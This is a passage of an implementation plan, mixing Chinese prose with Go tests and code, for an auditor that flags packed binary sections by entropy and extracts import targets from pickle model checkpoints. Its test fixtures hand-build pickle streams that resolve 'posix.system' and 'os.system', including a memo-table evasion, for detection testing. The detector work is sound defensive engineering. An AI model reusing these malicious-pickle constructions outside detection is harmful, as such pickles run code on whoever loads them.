// TestEntropyVerdictIsMeasuredNotAssumed pins the line the extractor emits and
// the threshold that gates it. The measurement is exact by construction:
// byte(i*7) cycles through every value of a byte before repeating, so a 512-byte
// buffer has a perfectly uniform histogram and its entropy is exactly 8.
func TestEntropyVerdictIsMeasuredNotAssumed(t *testing.T) {
	cfg := DefaultBinaryConfig()

	uniform := make([]byte, 512)
	for i := range uniform {
		uniform[i] = byte(i * 7)
	}
	if got := measureEntropy(uniform); math.Abs(got-8.0) > 1e-9 {
		t.Fatalf("fixture entropy = %v, want exactly 8; the fixture, not the code, is wrong", got)
	}

	if line, ok := entropyVerdict(".text", uniform, cfg); !ok || line != "high-entropy-executable-section .text 8.00" {
		t.Errorf("verdict = %q (emitted=%v), want high-entropy-executable-section .text 8.00", line, ok)
	}

	flat := bytes.Repeat([]byte{0x41}, 512)
	if line, ok := entropyVerdict(".text", flat, cfg); ok {
		t.Errorf("verdict = %q for a constant buffer, want no line", line)
	}

	// The comparison is inclusive: a section measuring exactly the threshold has
	// not exceeded it. The uniform buffer's entropy is exactly 8 by construction,
	// so setting the threshold to 8 pins the boundary exactly - under a strict <
	// this case would emit a line and fail.
	atThreshold := cfg
	atThreshold.HighEntropyThreshold = 8.0
	if line, ok := entropyVerdict(".text", uniform, atThreshold); ok {
		t.Errorf("verdict = %q at exactly the threshold, want no line", line)
	}
}
```

在文件顶部 import 块补 `"bytes"`、`"math"`。

> 两个用例各自钉住一个此前**没有牙**的断言，都是靠变异实测出来的：删掉 `shannonEntropy` 的 `if total <= 0` 守卫不失败任何用例——全零直方图下循环对每个字节都 `continue`，`h` 本来就是 0，根本走不到除法，所以「empty input is zero」那个子测试的名字在**声称**它钉的是除法，实际不是；真正钉住除法的是新增的「a total of zero」用例（非零直方图 + 零总数，没有守卫就会得到 `-Inf`）。同理把 `if h <= cfg.HighEntropyThreshold` 改成 `<` 也不失败任何用例——两个夹具都不在阈值上，`<` 与 `<=` 无法区分；新增的 `atThreshold` 段把阈值设成夹具熵值本身（恰好 8），才让边界被钉住。

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run 'TestShannonEntropy|TestEntropyVerdict' 2>&1 | head -10
```

预期：编译失败，`undefined: shannonEntropy`。

- [ ] **Step 3: 实现**

追加到 `binary_evidence.go`：

```go
// shannonEntropy returns the bits per byte of a byte histogram.
//
// It is computed from counts rather than from the bytes so that the same
// function serves a buffer held in memory and a stream counted as it is read.
// A total of zero returns zero: an empty section has no entropy to speak of, and
// the alternative is a NaN that would compare false against every threshold and
// be silently dropped.
func shannonEntropy(counts [256]int64, total int64) float64 {
	if total <= 0 {
		return 0
	}
	var h float64
	for _, c := range counts {
		if c == 0 {
			continue
		}
		p := float64(c) / float64(total)
		h -= p * math.Log2(p)
	}
	return h
}

// measureEntropy is shannonEntropy over a buffer in memory, for the cases where
// the bytes are already in hand: an ELF section, a container member.
func measureEntropy(data []byte) float64 {
	var counts [256]int64
	for _, b := range data {
		counts[b]++
	}
	return shannonEntropy(counts, int64(len(data)))
}

// entropyVerdict renders an ELF section's entropy as evidence, or reports that
// there is nothing to say.
//
// It is called for executable sections only, and that restriction is the whole
// design: code is not random, so a section that holds instructions and measures
// near eight bits per byte has been compressed or encrypted and something must
// unpack it before it can run. Data is allowed to be random - a tensor blob and
// an encrypted payload look identical to this measurement - so measuring data
// would produce a finding per model file and none of them would mean anything.
//
// Only a high reading produces a line. Emitting one for every low reading would
// put a line per section per file into every prompt for no decision value, and
// the rule table matches on the "high-entropy-" prefix - so the threshold is
// applied here, where the number is, and the rule table carries only what to call
// it. That split is deliberate: severity is policy and lives in the rule table,
// the measurement is physics and lives here.
func entropyVerdict(section string, data []byte, cfg BinaryConfig) (string, bool) {
	h := measureEntropy(data)
	if h <= cfg.HighEntropyThreshold {
		return "", false
	}
	return fmt.Sprintf("high-entropy-executable-section %s %.2f", section, h), true
}
```

在 import 块补 `"math"`。

- [ ] **Step 4: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestShannonEntropy|TestEntropyVerdict' -v
```

预期全 PASS。

- [ ] **Step 5: 提交**

```bash
git add internal/codeaudit/binary_evidence.go internal/codeaudit/binary_evidence_test.go
git commit -m "feat(audit): measure binary section and file entropy as packing evidence"
```

---

### Task 4: pickle 目标抽取（opcode 解释器）

**Files:**
- Modify: `internal/codeaudit/binary_evidence.go`
- Test: `internal/codeaudit/binary_evidence_test.go`

背景：本任务替换一版按字节模式找目标的设计（`0x63` 后跟两段换行串，或 `0x8c`/`0x8c`/`0x93`）。那版在真实文件上就是错的：`models/examples/Retina-DKD/Retina-DKD/model/fusion_TransMUF_dkd_win_num3_lr1_ep5bc_4lnum_1_Nopretrain_DKD/net_001.pth` 里的 `data.pkl`（68362 字节、protocol 2）有 4 个真目标（`collections.OrderedDict`、`torch._utils._rebuild_tensor_v2`、`torch.FloatStorage`、`torch.LongStorage`，都在 `GLOBAL` 上），字节扫描器报出 39 个，其中只有 2 个干净、1 个损坏（`module="k.windows_weightq\x02ctorch._utils"`），并且因为 offset 150 处一个假匹配吞掉了 685 字节，把 offset 828 的真实 `torch.LongStorage` 整个漏掉。原因是 pickle 的数据段持有任意字节：一个字符串操作数的载荷里可以出现 `0x63` 与换行，扫描器把它读成 opcode，于是错位。所以这一版把解析器换成 opcode 解释器——它按语法消费每个 opcode 的操作数，因此不会错位；它带一张 memo 表，因为 `MEMOIZE`/`BINPUT`/`PUT` + `BINGET`/`GET` 是文档化的规避：模块名先存进 memo 再取回，任何"相邻性"扫描都看不见它，但取回的值仍在值栈上，解释器照认得。

- [ ] **Step 1: 写失败测试**

追加到 `binary_evidence_test.go`（import 块补 `archive/zip`、`bytes`、`encoding/binary`、`io`；`os`/`strings`/`testing` 已在 Task 2 引入）：

```go
// runPickleStream feeds data to a scanner in fixed-size chunks, which is the
// only way a boundary bug shows up: at 64 KiB every fixture here fits in a
// single chunk, and a scanner that mishandled a split operand would look
// perfect.
func runPickleStream(t *testing.T, data []byte, chunk int) *EvidenceSet {
	t.Helper()
	if chunk < 1 {
		chunk = 1
	}
	set := newTestEvidence("x.pkl", KindPickle)
	p := newPickleScanner(set)
	for i := 0; i < len(data); i += chunk {
		j := i + chunk
		if j > len(data) {
			j = len(data)
		}
		if _, err := p.Write(data[i:j]); err != nil {
			t.Fatalf("write: %v", err)
		}
	}
	p.Flush()
	return set
}

func pickleTargetsOf(set *EvidenceSet) []string {
	var out []string
	for _, l := range set.Lines {
		if l.Source == SourcePickle {
			out = append(out, l.Text)
		}
	}
	return out
}

// pickleBinUnicode encodes a protocol-2 BINUNICODE operand: the opcode, a 4-byte
// little-endian length, then the bytes. The length prefix is the whole difference
// between a scanner that reads this operand and one that reads into it.
func pickleBinUnicode(s string) []byte {
	b := []byte{0x58, 0, 0, 0, 0}
	binary.LittleEndian.PutUint32(b[1:], uint32(len(s)))
	return append(b, s...)
}

// pickleGlobal encodes "c module\nname\n".
func pickleGlobal(mod, name string) []byte {
	return []byte("c" + mod + "\n" + name + "\n")
}

// TestPickleInterpreterFindsTargetsInItsTwoEncodings pins both spellings of
// "resolve this attribute" and the offset rule: an evidence offset is the
// opcode's own offset, so it points at the 'c' of GLOBAL and the 0x93 of
// STACK_GLOBAL, never at a string operand.
func TestPickleInterpreterFindsTargetsInItsTwoEncodings(t *testing.T) {
	data := []byte{0x80, 0x04}
	data = append(data, pickleGlobal("posix", "system")...)
	data = append(data, 0x8c, 0x02)
	data = append(data, "os"...)
	data = append(data, 0x8c, 0x06)
	data = append(data, "system"...)
	data = append(data, 0x93, 0x2e) // STACK_GLOBAL, STOP

	set := runPickleStream(t, data, 64*1024)
	got := pickleTargetsOf(set)
	want := []string{"posix.system", "os.system"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("targets = %v, want %v", got, want)
	}
	if set.Lines[0].Offset != 2 {
		t.Errorf("offset = %d, want 2 (the GLOBAL opcode)", set.Lines[0].Offset)
	}
	if set.Bound.Structural {
		t.Errorf("structural bound on a well-formed stream: %s", set.Bound.Reason)
	}
}

// TestPickleInterpreterFindsTheTargetAfterBinaryData is the test the old design
// would have failed, and it is why this task exists. The string operand's payload
// ends with an unterminated run after a stray 0x63, so a byte scan reads a
// spurious GLOBAL whose operands run across the string boundary and swallow the
// genuine GLOBAL that follows - exactly how net_001.pth's torch.LongStorage was
// being lost. The interpreter must find both targets and must not read a byte
// inside the payload as an opcode.
func TestPickleInterpreterFindsTheTargetAfterBinaryData(t *testing.T) {
	stray := "c" + "junk\n" + "c" + strings.Repeat("Z", 300)
	data := []byte{0x80, 0x02}
	data = append(data, pickleBinUnicode(stray)...)
	data = append(data, pickleGlobal("posix", "system")...)
	data = append(data, pickleGlobal("torch._utils", "_rebuild_tensor_v2")...)
	data = append(data, 0x2e)

	set := runPickleStream(t, data, 64*1024)
	got := pickleTargetsOf(set)
	want := []string{"posix.system", "torch._utils._rebuild_tensor_v2"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("targets = %v, want %v", got, want)
	}
	if set.Bound.Structural {
		t.Errorf("structural bound on a well-formed stream: %s", set.Bound.Reason)
	}
}

// TestPickleInterpreterResolvesStackGlobalThroughTheMemo pins the evasion the
// memo table exists to close: the module and name are MEMOIZEd, fetched back with
// BINGET, and only then fed to STACK_GLOBAL. Neither string is adjacent to the
// opcode, so an adjacency scan sees nothing.
func TestPickleInterpreterResolvesStackGlobalThroughTheMemo(t *testing.T) {
	data := []byte{0x80, 0x04, 0x8c, 0x05}
	data = append(data, "posix"...)
	data = append(data, 0x94) // MEMOIZE -> memo[0]
	data = append(data, 0x8c, 0x06)
	data = append(data, "system"...)
	data = append(data, 0x94)       // MEMOIZE -> memo[1]
	data = append(data, 0x68, 0x00) // BINGET 0
	data = append(data, 0x68, 0x01) // BINGET 1
	data = append(data, 0x93, 0x2e) // STACK_GLOBAL, STOP

	got := pickleTargetsOf(runPickleStream(t, data, 64*1024))
	if len(got) != 1 || got[0] != "posix.system" {
		t.Fatalf("targets = %v, want [posix.system]", got)
	}
}

// TestPickleInterpreterReadsInstAsATarget pins the protocol-0/1 spelling of the
// same thing: INST carries module and name inline, like GLOBAL.
func TestPickleInterpreterReadsInstAsATarget(t *testing.T) {
	data := append([]byte{0x80, 0x04}, []byte("iposix\nsystem\n")...)
	data = append(data, 0x2e)
	got := pickleTargetsOf(runPickleStream(t, data, 64*1024))
	if len(got) != 1 || got[0] != "posix.system" {
		t.Fatalf("targets = %v, want [posix.system]", got)
	}
}

// TestPickleInterpreterIsChunkInvariant pins the property that makes the
// streaming contract correct: the parse carries its own state, so the listing
// cannot depend on where the reads split. The sizes below include 1 and the whole
// stream in a single Write, because those are the two extremes a one-chunk fixture
// would never exercise, and splitAfterLength, which puts a chunk boundary in the
// one place the parser is weakest - right after the length prefix of a zero-length
// counted operand, so that operand's completion is the first thing the next call
// sees.
//
// The zero-length operand is in the fixture because the interpreter used to
// mishandle exactly that: see TestPickleInterpreterParsesCPythonsZeroLengthOperands
// for why it is in every real checkpoint rather than being a synthetic edge.
func TestPickleInterpreterIsChunkInvariant(t *testing.T) {
	data := []byte{0x80, 0x04}
	data = append(data, pickleBinUnicode(strings.Repeat("data\x63\n", 400))...)
	data = append(data, pickleGlobal("os", "system")...)
	// A zero-length counted operand. pickle.dumps emits these, and the length
	// prefix is BINUNICODE's opcode plus four length bytes.
	zeroLenAt := len(data)
	data = append(data, pickleBinUnicode("")...)
	splitAfterLength := zeroLenAt + 5
	data = append(data, 0x8c, 0x03)
	data = append(data, "abc"...)
	data = append(data, 0x8c, 0x03)
	data = append(data, "def"...)
	data = append(data, 0x93, 0x2e)

	want := "os.system,abc.def"
	for _, size := range []int{1, 2, 3, 5, 8, 64, 1024, 64 * 1024, splitAfterLength, len(data)} {
		set := runPickleStream(t, data, size)
		if got := strings.Join(pickleTargetsOf(set), ","); got != want {
			t.Fatalf("chunk=%d gave %q, want %q", size, got, want)
		}
		if set.Bound.Structural {
			t.Fatalf("chunk=%d set a structural bound: %s", size, set.Bound.Reason)
		}
	}
}

// TestPickleInterpreterBoundsAnUnknownOpcode pins the fail-closed direction for
// the one case the interpreter cannot recover from: a byte it cannot classify is
// a place it does not know the next opcode starts, and stopping without a bound
// would let a later opcode hide.
func TestPickleInterpreterBoundsAnUnknownOpcode(t *testing.T) {
	data := []byte{0x80, 0x02}
	data = append(data, pickleGlobal("posix", "system")...)
	data = append(data, 0x99, 0x2e) // 0x99 is not a pickle opcode

	set := runPickleStream(t, data, 64*1024)
	if !set.Bound.Structural {
		t.Fatal("unknown opcode did not set Bound.Structural")
	}
	if got := pickleTargetsOf(set); len(got) != 1 || got[0] != "posix.system" {
		t.Errorf("targets before the unknown opcode were lost: %v", got)
	}
}

// TestPickleInterpreterBoundsATruncatedOperand pins that an operand the stream
// claimed and did not deliver is a structural gap, not a clean end.
func TestPickleInterpreterBoundsATruncatedOperand(t *testing.T) {
	// SHORT_BINUNICODE declares 5 bytes and delivers 3.
	mid := []byte{0x80, 0x02, 0x8c, 0x05, 'p', 'o', 's'}
	if set := runPickleStream(t, mid, 64*1024); !set.Bound.Structural {
		t.Error("a stream ending mid-opcode did not set Bound.Structural")
	}
	// A declared length past EOF is the same event.
	past := append([]byte{0x80, 0x02}, 0x58, 0xff, 0xff, 0x00, 0x00)
	if set := runPickleStream(t, past, 64*1024); !set.Bound.Structural {
		t.Error("a length past EOF did not set Bound.Structural")
	}
}

// TestPickleInterpreterBoundsAStreamThatNeverStops pins that a stream which never
// reaches STOP is structurally incomplete - and that an empty stream is not, for
// the same reason a bound that cost nothing is not a bound.
func TestPickleInterpreterBoundsAStreamThatNeverStops(t *testing.T) {
	for _, data := range [][]byte{{0x80, 0x02}, {0x80, 0x02, 0x4e}} {
		if set := runPickleStream(t, data, 64*1024); !set.Bound.Structural {
			t.Errorf("%x: a stream without STOP did not set Bound.Structural", data)
		}
	}
	if set := runPickleStream(t, nil, 64*1024); set.Bound.Structural {
		t.Error("an empty stream set Bound.Structural")
	}
}

// TestPickleInterpreterToleratesBytesAfterStop pins the one place trailing data
// is not a bound: the unpickler stops at STOP too, so the bytes after it are
// outside the structure that can execute. They stay visible as a notice, so the
// loss is not silent.
func TestPickleInterpreterToleratesBytesAfterStop(t *testing.T) {
	data := []byte{0x80, 0x02}
	data = append(data, pickleGlobal("posix", "system")...)
	data = append(data, 0x2e)
	data = append(data, []byte("this padding is not part of the pickle")...)

	set := runPickleStream(t, data, 64*1024)
	if set.Bound.Structural {
		t.Fatalf("bytes after STOP set Bound.Structural: %s", set.Bound.Reason)
	}
	var notice bool
	for _, l := range set.Lines {
		if l.Source == SourceNotice {
			notice = true
		}
	}
	if !notice {
		t.Error("bytes after STOP produced no notice; the loss is invisible")
	}
}

// TestPickleInterpreterBoundsAnUnresolvedStackGlobalOperand pins the bound to the
// only condition that hides a target - an unresolvable value actually used as a
// module or name - and pins the other half too: a dangling reference that is
// never so used is tolerated, because being strict there would put a bound on
// benign streams.
func TestPickleInterpreterBoundsAnUnresolvedStackGlobalOperand(t *testing.T) {
	used := []byte{0x80, 0x04, 0x68, 0x00, 0x8c, 0x06}
	used = append(used, "system"...)
	used = append(used, 0x93, 0x2e) // BINGET 0 (never written), STACK_GLOBAL
	if set := runPickleStream(t, used, 64*1024); !set.Bound.Structural {
		t.Error("an unresolved STACK_GLOBAL operand did not set Bound.Structural")
	}
	unused := []byte{0x80, 0x04, 0x68, 0x00, 0x2e} // BINGET 0, never used
	if set := runPickleStream(t, unused, 64*1024); set.Bound.Structural {
		t.Errorf("an unused dangling reference set Bound.Structural: %s", set.Bound.Reason)
	}
}

// TestPickleInterpreterNamesNothingInProse pins that the parser is a parser: the
// words appear, but not in opcode shape, so no target is reported. (In production
// the interpreter is gated to streams claimed as pickles, so prose never reaches
// it; this asserts the parser's own silence.)
func TestPickleInterpreterNamesNothingInProse(t *testing.T) {
	data := []byte("the posix system call interface is described here")
	if got := pickleTargetsOf(runPickleStream(t, data, 64*1024)); len(got) != 0 {
		t.Errorf("targets = %v, want none from prose", got)
	}
}

// TestPickleInterpreterSurvivesAdversarialBytes pins that the parser is total:
// every input either parses or records why it could not, and none of them makes
// it panic. It is fed attacker-controlled bytes by definition. The bytes are
// enumerated rather than random so the test is deterministic.
func TestPickleInterpreterSurvivesAdversarialBytes(t *testing.T) {
	for b := 0; b < 256; b++ {
		runPickleStream(t, []byte{0x80, 0x04, byte(b), byte(b), byte(b), 0x2e}, 3)
	}
	full := append([]byte{0x80, 0x04}, pickleGlobal("os", "system")...)
	full = append(full, 0x2e)
	for n := 0; n <= len(full); n++ { // every truncation of a valid stream
		runPickleStream(t, full[:n], 1)
	}
}

// TestPickleInterpreterReadsTheRealCheckpoint runs the interpreter over the one
// real checkpoint in this repository that exercises the defect: a protocol-2
// torch stream whose four GLOBAL targets sit around large binary operands, the
// last of them at an offset a byte scan was swallowing. It skips when the file is
// absent, because the corpus is not carried in every checkout.
func TestPickleInterpreterReadsTheRealCheckpoint(t *testing.T) {
	const ckpt = "../../models/examples/Retina-DKD/Retina-DKD/model/" +
		"fusion_TransMUF_dkd_win_num3_lr1_ep5bc_4lnum_1_Nopretrain_DKD/net_001.pth"
	if _, err := os.Stat(ckpt); err != nil {
		t.Skipf("corpus checkpoint not present: %v", err)
	}
	zr, err := zip.OpenReader(ckpt)
	if err != nil {
		t.Fatalf("open %s: %v", ckpt, err)
	}
	defer zr.Close()

	var pkl []byte
	for _, f := range zr.File {
		if strings.HasSuffix(f.Name, "/data.pkl") {
			rc, err := f.Open()
			if err != nil {
				t.Fatal(err)
			}
			pkl, err = io.ReadAll(rc)
			rc.Close()
			if err != nil {
				t.Fatal(err)
			}
		}
	}
	if pkl == nil {
		t.Fatal("no data.pkl member in the checkpoint")
	}

	set := runPickleStream(t, pkl, 64*1024)
	got := pickleTargetsOf(set)
	want := []string{
		"collections.OrderedDict",
		"torch._utils._rebuild_tensor_v2",
		"torch.FloatStorage",
		"torch.LongStorage", // the target the byte scan missed
	}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("targets = %v, want %v", got, want)
	}
	if set.Bound.Structural {
		t.Errorf("the real checkpoint set Bound.Structural: %s", set.Bound.Reason)
	}
}

// TestPickleInterpreterParsesCPythonsZeroLengthOperands pins the interpreter
// against the two byte strings CPython itself produces for a zero-length operand,
// because the defect they exercise was in the interpreter, not in a hand-built
// fixture. Each is fed both in one 64 KiB chunk and in a single Write, since the
// streaming reader reads a file that fits one chunk in a single call. The assertion
// is on the extracted targets as well as the bound: the BINUNICODE case used to
// both set a structural bound and lose the target that followed it, so a test that
// checked only the bound would see half the defect.
//
// The defect is worth stating in the test that pins it. step used to return 0
// after completing a counted operand whose declared length was zero, and Write
// reads a 0 as "needs more input" - so it stopped, and the bytes after the operand
// stayed in the buffer. When the operand sat in the final Write, nothing drained
// that buffer and Flush reported a complete, valid pickle as ending without STOP.
// KindPickle is an executable kind, so that bound blocks the import and deletes
// the package. Every real data.pkl in this repository has a zero-length BINUNICODE
// (the empty-string key of a state dict), at offsets 1315, 1315, 12830, 52607 and
// 52607 across the five of them, so this was not an edge case: it was the next
// three packages to be audited.
func TestPickleInterpreterParsesCPythonsZeroLengthOperands(t *testing.T) {
	cases := []struct {
		name    string
		data    []byte
		targets []string
	}{
		{
			name: "pickle.dumps(b'', protocol=4): SHORT_BINBYTES of length 0",
			data: []byte{0x80, 0x04, 0x95, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x43, 0x00, 0x94, 0x2e},
		},
		{
			name:    "pickle.dumps({'': b''}, protocol=2): BINUNICODE of length 0 before a GLOBAL",
			data:    []byte{0x80, 0x02, 0x7d, 0x71, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x71, 0x01, 0x63, 0x5f, 0x5f, 0x62, 0x75, 0x69, 0x6c, 0x74, 0x69, 0x6e, 0x5f, 0x5f, 0x0a, 0x62, 0x79, 0x74, 0x65, 0x73, 0x0a, 0x71, 0x02, 0x29, 0x52, 0x71, 0x03, 0x73, 0x2e},
			targets: []string{"__builtin__.bytes"},
		},
	}
	for _, tc := range cases {
		for _, chunk := range []int{64 * 1024, len(tc.data)} {
			set := runPickleStream(t, tc.data, chunk)
			if set.Bound.Structural {
				t.Errorf("%s (chunk=%d): structural bound: %s", tc.name, chunk, set.Bound.Reason)
			}
			got := pickleTargetsOf(set)
			if strings.Join(got, ",") != strings.Join(tc.targets, ",") {
				t.Errorf("%s (chunk=%d): targets = %v, want %v", tc.name, chunk, got, tc.targets)
			}
		}
	}
}

// TestPickleInterpreterReadsTheQuickMnistCheckpointInOneWrite is the load-bearing
// regression test for the zero-length operand, and it uses a real file rather than
// a fixture. Its data.pkl is 1548 bytes and holds a zero-length BINUNICODE at
// offset 1315; at evidenceReadChunk (64 KiB) the whole stream arrives in one Write,
// which is exactly the case the defect mis-handled - the bytes after the operand
// were left in the buffer and Flush reported a complete pickle as structural.
// Before the fix this test fails; the same checkpoint read in chunks that split
// after the operand passes even while broken, which is why a fixture that fits one
// chunk is the one to use.
//
// It deliberately does not reuse net_001.pth, the checkpoint the test above reads.
// net_001's data.pkl is 68362 bytes, so under a 64 KiB chunk it needs two Writes
// and the stranded tail is picked up by the second one - it self-heals, and it
// would report green against the broken interpreter. The three data.pkl files in
// this corpus that fit a single 64 KiB read (1548, 1548 and 16009 bytes) are the
// ones that expose the defect, and quick_mnist/train_baseline.pth is one of them.
func TestPickleInterpreterReadsTheQuickMnistCheckpointInOneWrite(t *testing.T) {
	const ckpt = "../../models/examples/TEE-test/TEE-test/output/quick_mnist/train_baseline.pth"
	if _, err := os.Stat(ckpt); err != nil {
		t.Skipf("corpus checkpoint not present: %v", err)
	}
	pkl := readZipMember(t, ckpt, "/data.pkl")
	if pkl == nil {
		t.Fatal("no data.pkl member in the checkpoint")
	}
	// One Write, then Flush: the whole file in a single chunk, as the streaming
	// reader does for a file this size.
	set := runPickleStream(t, pkl, len(pkl))
	if set.Bound.Structural {
		t.Fatalf("the checkpoint was marked structural read whole: %s", set.Bound.Reason)
	}
	got := pickleTargetsOf(set)
	want := []string{
		"collections.OrderedDict",
		"torch._utils._rebuild_tensor_v2",
		"torch.FloatStorage",
		"torch.LongStorage",
	}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("targets = %v, want %v", got, want)
	}
}

// readZipMember returns the bytes of the last zip member whose name has the given
// suffix, or nil when there is none. It exists because a second corpus test was
// added after the first one had already written this loop inline.
func readZipMember(t *testing.T, path, suffix string) []byte {
	t.Helper()
	zr, err := zip.OpenReader(path)
	if err != nil {
		t.Fatalf("open %s: %v", path, err)
	}
	defer zr.Close()
	var out []byte
	for _, f := range zr.File {
		if !strings.HasSuffix(f.Name, suffix) {
			continue
		}
		rc, err := f.Open()
		if err != nil {
			t.Fatal(err)
		}
		out, err = io.ReadAll(rc)
		rc.Close()
		if err != nil {
			t.Fatal(err)
		}
	}
	return out
}

// TestPickleInterpreterKeepsOperandsUpToTheCapAndDropsPastIt pins the
// pickleMaxOperandBytes boundary in both directions. At the cap the operand is
// kept, so a target formed from it resolves; one byte past it the bytes are still
// consumed - the parse stays in step - but the value is unresolved, so using it as
// a STACK_GLOBAL operand is a structural bound rather than a silent wrong answer.
func TestPickleInterpreterKeepsOperandsUpToTheCapAndDropsPastIt(t *testing.T) {
	atCap := strings.Repeat("m", pickleMaxOperandBytes)
	kept := []byte{0x80, 0x04}
	kept = append(kept, pickleBinUnicode(atCap)...)
	kept = append(kept, 0x8c, 0x01, 'x')
	kept = append(kept, 0x93, 0x2e)
	set := runPickleStream(t, kept, 64*1024)
	if set.Bound.Structural {
		t.Fatalf("an operand exactly at the cap set a structural bound: %s", set.Bound.Reason)
	}
	if got := pickleTargetsOf(set); len(got) != 1 || got[0] != atCap+".x" {
		t.Fatalf("targets = %d entries, want one of the cap-length module; the operand at the cap was dropped", len(got))
	}

	past := []byte{0x80, 0x04}
	past = append(past, pickleBinUnicode(strings.Repeat("m", pickleMaxOperandBytes+1))...)
	past = append(past, 0x8c, 0x01, 'x')
	past = append(past, 0x93, 0x2e)
	if set := runPickleStream(t, past, 64*1024); !set.Bound.Structural {
		t.Error("an operand past the cap, used as a STACK_GLOBAL operand, did not set Bound.Structural")
	}
}

// TestPickleInterpreterReadsTwoByteOperands pins the 2-byte operand width, which
// only BININT2 and EXT2 use. Reading one byte of it - or three - desynchronises the
// parse at that opcode and is invisible unless the stream continues past it, so the
// fixture puts a GLOBAL after the operand and asserts it is still found.
func TestPickleInterpreterReadsTwoByteOperands(t *testing.T) {
	for _, op := range []byte{0x4d, 0x83} { // BININT2, EXT2
		data := []byte{0x80, 0x04, op, 0x01, 0x02}
		data = append(data, pickleGlobal("os", "system")...)
		data = append(data, 0x2e)
		set := runPickleStream(t, data, 64*1024)
		if set.Bound.Structural {
			t.Errorf("opcode 0x%02x: structural bound: %s", op, set.Bound.Reason)
		}
		if got := pickleTargetsOf(set); len(got) != 1 || got[0] != "os.system" {
			t.Errorf("opcode 0x%02x: targets = %v, want [os.system]: the 2-byte operand desynchronised the parse", op, got)
		}
	}
}

// TestPickleInterpreterBoundsARunawayStack pins that the value-stack cap is
// enforced and reported. A flood of operand-free opcodes is the cheapest way to
// grow the stack - each NONE is one byte and one slot - so it is what an attacker
// would send, and a cap that stopped the parse without recording a bound would
// miss every target after the cap while looking like a complete scan.
func TestPickleInterpreterBoundsARunawayStack(t *testing.T) {
	data := bytes.Repeat([]byte{0x4e}, pickleMaxStackSlots*2) // NONE
	set := runPickleStream(t, data, 64*1024)
	if !set.Bound.Structural {
		t.Fatal("a runaway value stack did not set Bound.Structural; the cap is silent")
	}
	if !strings.Contains(set.Bound.Reason, "value stack") {
		t.Errorf("reason = %q, want it to name the value stack", set.Bound.Reason)
	}
}

// TestPickleInterpreterBoundsARunawayMemo pins the memo cap the same way. MEMOIZE
// is one byte and adds one entry, so it is the memo-side analogue of the NONE
// flood.
func TestPickleInterpreterBoundsARunawayMemo(t *testing.T) {
	data := bytes.Repeat([]byte{0x94}, pickleMaxMemoSlots*2) // MEMOIZE
	set := runPickleStream(t, data, 64*1024)
	if !set.Bound.Structural {
		t.Fatal("a runaway memo did not set Bound.Structural; the cap is silent")
	}
	if !strings.Contains(set.Bound.Reason, "memo") {
		t.Errorf("reason = %q, want it to name the memo", set.Bound.Reason)
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run TestPickleInterpreter 2>&1 | head -10
```

预期：编译失败，`undefined: runPickleStream`（以及实现侧的 `newPickleScanner` 等新符号）。

- [ ] **Step 3: 实现**

追加到 `binary_evidence.go`（文件顶部 import 块补 `"bytes"` 与 `"encoding/binary"`）。

**删除**：这一版把 Task 4 曾经的字节扫描实现整个换掉，所以 `pickleTargets`、`readLineString`、`readShortBinUnicode`、`pickleTarget` 类型、`pickleCarryBytes` 常量，以及旧的 `pickleScanner` 结构与它的 `emit` **都不再存在**——实现者要删掉它们，而不是留着。留着不只是死代码：一个已被真实文件证伪的"按字节找相邻模式"留在树里，会让后来者以为那条路是可选的。

先补 opcode 表与状态机：

```go
// The pickle interpreter walks an opcode stream as opcodes, not as bytes.
//
// A byte-pattern scanner cannot do this job. A pickle stream interleaves its
// opcodes with raw data payloads - string and byte operands hold arbitrary
// bytes, including 0x63 and newlines - so any scan that hunts for "GLOBAL
// followed by two newline-terminated runs" will eventually read a data byte as
// an opcode, desynchronise, and then either invent a target out of the data or
// skip over a real one. Measured on models/examples/Retina-DKD's net_001.pth,
// whose data.pkl is a 68362-byte protocol-2 stream with four genuine GLOBAL
// opcodes, that scanner reported 39 targets - two clean, one corrupted, and
// torch.LongStorage missing because a false-positive match at offset 150
// swallowed the 685 bytes containing it. The whole point of this channel is to
// catch "c posix\nsystem\n"; a target that lands where torch.LongStorage landed
// was being silently dropped.
//
// So the parser is an interpreter. It does not build objects and it does not
// need to: it needs to consume every opcode's operand at the right width so it
// never loses its place, and it needs to resolve two things - the two inline
// operands of GLOBAL and INST, and the top two stack items at STACK_GLOBAL. The
// memo table closes a documented evasion: a stream that MEMOIZEs a module name
// and fetches it back with BINGET has no target adjacent to STACK_GLOBAL, so no
// adjacency scan can see it, but the value is still on the stack when the opcode
// runs.

// pickOperand classifies how an opcode's operand is framed.
type pickOperand uint8

const (
	pickNone pickOperand = iota
	pickFixed1
	pickFixed2
	pickFixed4
	pickFixed8
	pickLine     // bytes through the next newline
	pickTwoLines // two of those, as GLOBAL and INST encode their operands
	pickCounted1 // 1-byte little-endian length, then that many payload bytes
	pickCounted4 // 4-byte little-endian length, then the payload
	pickCounted8 // 8-byte little-endian length, then the payload
)

// operandOf names the operand framing of one opcode, and reports whether the byte
// is an opcode at all.
//
// The table is the complete protocol 0-5 set, and completeness is load-bearing.
// Leaving an opcode out does not degrade a result - it desynchronises the parse at
// that byte and turns the rest of the stream into noise. A missed opcode is
// therefore worse than a missed target, and there is no opcode here that is safe
// to skip: the cost of each is one case, and the cost of a gap is a checkpoint
// that either loses its targets or blocks the import on a false structural bound.
func operandOf(op byte) (pickOperand, bool) {
	switch op {
	case 0x2e, 0x30, 0x31, 0x32, 0x4e, 0x51, 0x52, 0x61, 0x62,
		0x64, 0x65, 0x6c, 0x6f, 0x73, 0x74, 0x75, 0x7d, 0x5d, 0x29,
		0x81, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8f, 0x90, 0x91, 0x92,
		0x93, 0x94, 0x97, 0x98, 0x28:
		// STOP POP POP_MARK DUP NONE BINPERSID REDUCE APPEND BUILD DICT
		// APPENDS LIST OBJ SETITEM TUPLE SETITEMS EMPTY_DICT EMPTY_LIST
